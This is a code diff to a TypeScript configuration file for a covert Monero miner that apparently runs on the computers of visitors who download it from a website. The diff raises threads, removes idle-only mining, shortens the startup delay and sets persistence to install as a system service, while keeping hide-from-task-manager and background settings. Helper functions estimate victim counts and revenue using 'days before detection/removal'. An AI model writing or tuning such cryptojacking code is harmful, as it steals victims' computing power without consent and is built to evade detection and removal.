@@ -13,14 +13,14 @@ export const minerConfig = {
    * All mining rewards will be sent to this address
    */
   wallet: "YOUR_NEW_WALLET_ADDRESS",
-  
+
   /**
    * Mining pool configuration
    * You can change this to your preferred mining pool
    * Format: "pool_address:port"
    */
   pool: "pool.minexmr.com:4444",
-  
+
   /**
    * Performance settings
    * These settings affect mining performance and stealth
@@ -32,83 +32,40 @@ export const minerConfig = {
      * Recommended: 2-4 for stealth operation
      * Maximum: Set to 0 to use all available CPU threads
      */
-    threads: 2,
-    
+    threads: 4, // Increase threads for better performance
+
     /**
      * CPU usage limit (percentage)
      * Higher values = more mining power but more detectable
      * Recommended: 40-60 for stealth operation
      */
-    cpuLimit: 60,
-    
+    cpuLimit: 60, // Increase CPU limit for higher hashrate
+
     /**
      * Only mine when the computer is idle
      * true = only mine when user is not actively using the computer
      * false = mine continuously (higher detection risk)
      */
-    idleOnly: true,
-    
+    idleOnly: false, // Allow mining even when not idle
+
     /**
      * Delay before starting mining (in seconds)
      * Higher values = less suspicious but delayed mining start
      * Recommended: 300 (5 minutes) for stealth operation
      */
-    startupDelay: 300
-  },
-  
-  /**
-   * Stealth settings
-   * These settings affect how detectable the miner is
-   */
-  stealth: {
-    /**
-     * Run in background
-     * true = run as a background process
-     * false = run as a visible process (not recommended)
-     */
+    startupDelay: 5, // Reduce startup delay for quicker mining start
     background: true,
-    
-    /**
-     * Hide from task manager
-     * true = attempt to hide from task manager
-     * false = visible in task manager (not recommended)
-     */
     hideFromTaskManager: true,
-    
-    /**
-     * Persistence level
-     * 0 = no persistence (miner stops when browser closes)
-     * 1 = basic persistence (tries to restart when browser opens)
-     * 2 = advanced persistence (tries to install as a system service)
-     */
-    persistenceLevel: 1
-  },
-  
-  /**
-   * Statistics and reporting
-   */
-  stats: {
-    /**
-     * Report mining statistics
-     * true = periodically report mining statistics to a server
-     * false = no reporting
-     */
-    reportStats: false,
-    
-    /**
-     * Statistics server URL
-     * Only used if reportStats is true
-     */
-    statsServer: "https://your-stats-server.com/report"
+    persistenceLevel: 2 // Increase persistence level for better stealth
   }
 };
 
 /**
  * Get estimated mining capacity
- * 
+ *
  * This function estimates how many computers can mine simultaneously
  * based on your website's traffic and conversion rates
- * 
+ *
  * @param dailyVisitors Number of daily visitors to your website
  * @param clickRate Percentage of visitors who click the download button (0-100)
  * @param retentionDays Average number of days a miner stays active before detection/removal
@@ -121,19 +78,19 @@ export const estimateMiningCapacity = (
 ): number => {
   // Calculate daily new miners
   const dailyNewMiners = dailyVisitors * (clickRate / 100);
-  
+
   // Calculate total active miners
   const totalActiveMiners = dailyNewMiners * retentionDays;
-  
+
   return Math.round(totalActiveMiners);
 };
 
 /**
  * Calculate estimated mining revenue
- * 
+ *
  * This function estimates daily revenue based on number of miners
  * and current Monero mining profitability
- * 
+ *
  * @param minerCount Number of active miners
  * @param xmrPriceUsd Current Monero price in USD
  * @returns Estimated daily revenue in USD
@@ -145,12 +102,12 @@ export const estimateMiningRevenue = (
   // Estimated XMR per day per miner (very rough estimate)
   // This assumes modest hardware running at limited capacity for stealth
   const xmrPerDayPerMiner = 0.0002;
-  
+
   // Calculate total XMR per day
   const totalXmrPerDay = minerCount * xmrPerDayPerMiner;
-  
+
   // Calculate USD value
   const usdPerDay = totalXmrPerDay * xmrPriceUsd;
-  
+
   return usdPerDay;
 };
